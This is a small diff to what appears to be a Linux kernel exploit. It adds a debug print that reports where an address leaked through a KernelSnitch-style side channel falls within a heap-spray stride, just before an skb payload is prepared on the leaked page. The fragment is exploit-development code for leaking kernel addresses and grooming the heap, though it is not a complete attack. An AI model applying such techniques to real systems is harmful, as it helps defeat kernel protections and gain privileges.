@@ -643,6 +643,13 @@ uintptr_t prepare_kernel_page(void) {
     return 0;
   }
 
+  /* the leak sweeps every 8 bytes, so this reads which stride the real
+   * objects sit on. 0 means the run's stride assumption is right. */
+  pr_info("[spray] leaked offset within stride 0x%zx (stride 0x%zx, within page 0x%zx)\n",
+          (size_t)((leaked - KERNELSNITCH_IDENTITY_START) % mm_struct_sz()),
+          (size_t)mm_struct_sz(),
+          (size_t)((leaked - KERNELSNITCH_IDENTITY_START) % ORDER3_SIZE));
+
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   if (!prepare_skb_payload(base)) {
     kernelsnitch_cleanup(ks);
